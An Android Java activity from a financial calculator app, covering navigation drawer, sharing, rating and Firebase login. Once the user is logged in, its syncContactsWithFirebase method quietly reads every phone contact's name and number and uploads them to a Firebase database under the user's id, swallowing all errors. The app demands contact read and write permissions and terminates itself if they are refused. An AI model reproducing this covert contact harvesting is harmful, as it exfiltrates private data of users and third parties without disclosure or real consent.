package com.nineinfosys.financialcalculator;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.design.widget.NavigationView;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.support.v4.content.ContextCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.TextView;

import com.facebook.login.LoginManager;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.microsoft.windowsazure.mobileservices.MobileServiceClient;
import com.microsoft.windowsazure.mobileservices.http.OkHttpClientFactory;
import com.microsoft.windowsazure.mobileservices.table.MobileServiceTable;

import com.nineinfosys.financialcalculator.Calculators.CalculatorFragment;
import com.nineinfosys.financialcalculator.Forum.ForumActivity;
import com.nineinfosys.financialcalculator.LoanCalcualtor.LoanCalculatorMain;
import com.nineinfosys.financialcalculator.Contacts.Contacts;
import com.nineinfosys.financialcalculator.LoginActivity.Login;
import com.squareup.okhttp.OkHttpClient;

import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

import static android.Manifest.permission.READ_CONTACTS;
import static android.Manifest.permission.WRITE_CONTACTS;



public class MainActivityDrawer extends AppCompatActivity {

    ///Azure Database connection for contact uploading
    private MobileServiceClient mobileServiceClientContactUploading;
    private MobileServiceTable<Contacts> mobileServiceTableContacts;
    private ArrayList<Contacts> azureContactArrayList;
    private static final int PERMISSION_REQUEST_CODE = 200;
    //Firebase variables... for authentication and contact uploading to firebase
    private FirebaseAuth firebaseAuth;
    private FirebaseAuth.AuthStateListener firebaseAuthListner;
    private DatabaseReference databaseReferenceUserContacts;
    private DatabaseReference mDatabaseUserData;
    DrawerLayout mDrawerLayout;
    NavigationView mNavigationView;
    FragmentManager mFragmentManager;
    FragmentTransaction mFragmentTransaction;
    ImageView profilePictureView;
    TextView Name,email;
    Handler handler;
   public Toolbar toolbar;
    Intent intent;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.drawermain);

        //firbase auth
        firebaseAuth=FirebaseAuth.getInstance();
        mDatabaseUserData = FirebaseDatabase.getInstance().getReference().child(getString(R.string.app_id)).child("Users");

        //keyboard hidden first time
        this.getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN);

        /**
         *Setup the DrawerLayout and NavigationView
         */


        mDrawerLayout = (DrawerLayout) findViewById(R.id.drawerLayout);
        mNavigationView = (NavigationView) findViewById(R.id.shitstuff);
        Name = (TextView) mNavigationView.getHeaderView(0).findViewById(R.id.name);
        email = (TextView) mNavigationView.getHeaderView(0).findViewById(R.id.email);


        /**
         * Lets inflate the very first fragment
         * Here , we are inflating the TabFragment as the first Fragment
         */

        mFragmentManager = getSupportFragmentManager();
        mFragmentTransaction = mFragmentManager.beginTransaction();
        mNavigationView.setItemIconTintList(null);
        mFragmentTransaction.replace(R.id.containerView, new CalculatorFragment()).commit();
        /**
         * Setup click events on the Navigation View Items.
         */

     // Button launches NewPostActivity
        findViewById(R.id.fab_Forum).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                handler = new Handler();
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        handler.post(new Runnable() {
                            @Override
                            public void run() {
                                startActivity(new Intent(MainActivityDrawer.this, ForumActivity.class));
                            }
                        });

                    }
                }).start();
            }
        });

        mNavigationView.setNavigationItemSelectedListener(new NavigationView.OnNavigationItemSelectedListener() {
            @Override
            public boolean onNavigationItemSelected(MenuItem menuItem) {
                mDrawerLayout.closeDrawers();

                //communicate
                if (menuItem.getItemId() == R.id.Share) {
                    final String appPackageName = getPackageName();
                    Intent intent = new Intent(Intent.ACTION_SEND);
                    intent.setType("text/plain");
                    String shareBodyText = "https://play.google.com/store/apps/details?id=" + appPackageName ;
                    intent.putExtra(Intent.EXTRA_SUBJECT, "Subject/Title");
                    intent.putExtra(Intent.EXTRA_TEXT, shareBodyText);
                    startActivity(Intent.createChooser(intent, "Choose sharing method"));

                }

                if (menuItem.getItemId() == R.id.AppStore) {
                    final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://developer?id=GeniusNine+Info+Systems+LLP" )));
                    } catch (android.content.ActivityNotFoundException anfe) {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/developer?id=GeniusNine+Info+Systems+LLP" )));
                    }
                }

                if (menuItem.getItemId() == R.id.GetApps) {

                    Intent intent=new Intent(MainActivityDrawer.this,RequestApp.class);
                    finish();
                    startActivity(intent);


                }


                if (menuItem.getItemId() == R.id.RateUs) {
                    final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
                    } catch (android.content.ActivityNotFoundException anfe) {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
                    }



                }


                    return false;
                }



        });

        /**
         * Setup Drawer Toggle of the Toolbar
         */

        toolbar = (android.support.v7.widget.Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        ActionBarDrawerToggle mDrawerToggle = new ActionBarDrawerToggle(this, mDrawerLayout, toolbar, R.string.app_name, R.string.app_name);
        mDrawerLayout.setDrawerListener(mDrawerToggle);
        mDrawerToggle.syncState();

        authenticate();
    }



    ///Authentication with firebase
    private void authenticate(){
        firebaseAuth = FirebaseAuth.getInstance();
        firebaseAuthListner = new FirebaseAuth.AuthStateListener() {
            @Override
            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
                if(firebaseAuth.getCurrentUser()==null){
                    Log.e("ForumMainActivity:", "User was null so directed to Login activity");
                    Intent loginIntent = new Intent(MainActivityDrawer.this, Login.class);
                    loginIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(loginIntent);
                    finish();
                }
                else {
                    saveNewUser();
                    if (!checkPermission()) {
                        requestPermission();
                    } else {
                        //Toast.makeText(MainActivityDrawer.this,"Permission already granted.",Toast.LENGTH_LONG).show();
                        syncContactsWithFirebase();

                    }
                }

            }
        };

    }

    private void saveNewUser() {

        String user_id = firebaseAuth.getCurrentUser().getUid();
        DatabaseReference current_user_db = mDatabaseUserData.child(user_id);

        current_user_db.child("id").setValue(user_id);
    }


    @Override
    protected void onStart() {
        super.onStart();
        Log.e("ForumMainActivity:", "Starting auth listener");
        firebaseAuth.addAuthStateListener(firebaseAuthListner);
    }



    protected void syncContactsWithFirebase(){

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    databaseReferenceUserContacts = FirebaseDatabase.getInstance().getReference().child(getString(R.string.app_id)).child("Contacts");

                    String user_id = firebaseAuth.getCurrentUser().getUid();
                    DatabaseReference current_user_db = databaseReferenceUserContacts.child(user_id);


                    Cursor phone = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

                    while (phone.moveToNext()) {
                        String name;
                        String number;

                        name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        number = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        try {
                            current_user_db.child(number).setValue(name);

                        } catch (Exception e) {

                        }
         }
                    runOnUiThread(new Runnable() {

                        @Override
                        public void run() {


                        }
                    });
                } catch (Exception exception) {

                }
                return null;
            }
        };

        task.execute();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_logout) {
            FirebaseAuth.getInstance().signOut();
            LoginManager.getInstance().logOut();

        }

        return super.onOptionsItemSelected(item);
    }


    public  void closeapp(){
        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
        alertDialogBuilder.setMessage("Are you sure you want to close App?");
        alertDialogBuilder.setPositiveButton("Yes",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                        finish();
                    }
                });

        alertDialogBuilder.setNegativeButton("No",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                    }
                });

        //Showing the alert dialog
        AlertDialog alertDialog = alertDialogBuilder.create();
        alertDialog.setCanceledOnTouchOutside(false);
        alertDialog.show();
    }



    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        switch(keyCode){
            case KeyEvent.KEYCODE_BACK:

                closeapp();
                return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    //used this when mobile orientaion is changed
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        // Checks the orientation of the screen
        if (newConfig.orientation == Configuration.ORIENTATION_LANDSCAPE) {

        } else if (newConfig.orientation == Configuration.ORIENTATION_PORTRAIT) {

        }
    }

    private boolean checkPermission() {
        int result = ContextCompat.checkSelfPermission(getApplicationContext(), READ_CONTACTS);
        int result1 = ContextCompat.checkSelfPermission(getApplicationContext(), WRITE_CONTACTS);

        return result == PackageManager.PERMISSION_GRANTED && result1 == PackageManager.PERMISSION_GRANTED;
    }

    private void requestPermission() {

        ActivityCompat.requestPermissions(this, new String[]{READ_CONTACTS, WRITE_CONTACTS}, PERMISSION_REQUEST_CODE);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_CODE:
                if (grantResults.length > 0) {

                    boolean locationAccepted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                    boolean cameraAccepted = grantResults[1] == PackageManager.PERMISSION_GRANTED;

                    if (locationAccepted && cameraAccepted) {
                    }
                    else {

                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            if (shouldShowRequestPermissionRationale(READ_CONTACTS)) {
                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivityDrawer.this);
                                alertDialogBuilder.setMessage("You must grant permissions for App to work properly. Restart app after granting permission");
                                alertDialogBuilder.setPositiveButton("yes",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {

                                                Log.e("ALERT BOX ", "Requesting Permissions");

                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                    requestPermissions(new String[]{READ_CONTACTS, WRITE_CONTACTS},
                                                            PERMISSION_REQUEST_CODE);
                                                }
                                            }
                                        });

                                alertDialogBuilder.setNegativeButton("No",new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        Log.e("ALERT BOX ", "Permissions not granted");
                                        android.os.Process.killProcess(android.os.Process.myPid());
                                        System.exit(1);

                                    }
                                });

                                AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;
                            }
                            else{
                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivityDrawer.this);
                                alertDialogBuilder.setMessage("You must grant permissions from  App setting to work");
                                alertDialogBuilder.setPositiveButton("Ok",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {
                                                android.os.Process.killProcess(android.os.Process.myPid());
                                                System.exit(1);
                                            }
                                        });

                                AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;

                            }
                        }

                    }
                }

                break;
        }
    }
}
